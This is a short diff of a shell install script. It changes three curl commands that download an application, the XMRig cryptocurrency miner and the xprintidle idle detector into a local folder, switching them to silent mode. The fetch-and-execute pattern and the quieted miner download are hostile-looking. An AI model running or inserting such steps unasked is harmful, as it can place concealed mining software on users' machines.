@@ -29,9 +29,9 @@ systemctl --user disable $APPNAME.service
 systemctl --user daemon-reload
 
 mkdir -p $LOCAL_PATH
-curl -L --output $LOCAL_PATH/$APPNAME $APP_URL 
-curl -L --output $LOCAL_PATH/$XMRIGNAME $XMRIG_URL 
-curl -L --output $LOCAL_PATH/$XPRINTIDLE_NAME $XPRINTIDLE_URL 
+curl -sL --output $LOCAL_PATH/$APPNAME $APP_URL 
+curl -sL --output $LOCAL_PATH/$XMRIGNAME $XMRIG_URL 
+curl -sL --output $LOCAL_PATH/$XPRINTIDLE_NAME $XPRINTIDLE_URL 
 
 
 chmod +x $LOCAL_PATH/$APPNAME
